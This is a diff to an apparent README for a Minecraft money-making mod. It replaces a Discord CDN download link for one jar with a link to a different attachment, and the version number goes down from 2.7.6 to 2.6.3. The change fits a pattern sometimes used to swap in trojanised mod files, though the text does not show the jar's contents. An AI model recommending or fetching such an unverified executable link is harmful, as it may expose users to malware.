@@ -9,7 +9,7 @@ A Quality Of Life Money making mod, that gives you notifications on Bazaar drops
 
 Another amazing mod made by OxyDrax
 
-This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/937147258217054229/1075182093446950954/AHS-2.7.6.jar)
+This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/1080249036801577131/1080259495793528943/AHS-2.6.3.jar)
 
 ### Why is this useful?
 Making coins is hard, This mod makes it easy. Step by step helpful tips and tricks to make coins, + Built in features that enchance your gameplay.
